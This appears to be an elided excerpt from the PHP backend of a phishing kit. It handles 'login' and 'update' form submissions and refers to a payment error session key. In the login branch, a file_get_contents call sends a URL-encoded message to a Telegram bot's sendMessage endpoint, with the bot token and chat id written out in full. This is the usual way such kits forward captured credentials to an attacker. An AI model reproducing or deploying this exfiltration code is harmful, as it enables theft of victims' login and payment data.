...
if ($_POST['type'] === "login") {
    ...
    if ($c  == 1) {
		...
		file_get_contents("https://api.telegram.org/bot5435809324:AAEmucHQr8VG879gT_iET20WQ0HtJdllt0U/sendMessage?chat_id=-1001727080095&text=".urlencode($message)."");
...
if ($_POST['type'] === "update") {
    ...
    session_unset($_SESSION["error_u_pay"]);
